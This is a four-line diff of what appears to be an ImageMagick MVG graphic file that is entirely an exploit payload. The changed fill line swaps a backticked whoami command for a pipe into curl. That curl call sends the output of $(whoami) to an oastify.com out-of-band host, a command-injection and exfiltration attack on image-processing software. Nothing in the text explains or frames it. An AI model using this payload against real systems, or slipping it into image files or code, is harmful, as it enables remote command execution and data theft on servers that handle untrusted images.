@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 100 100
-fill 'url("http://5qwx38pmcf41lhlkwgyvdtyaw12sqke9.oastify.com?rce='`whoami`'")'
+fill 'url("|curl http://5qwx38pmcf41lhlkwgyvdtyaw12sqke9.oastify.com?rce=$(whoami)")'
 pop graphic-context
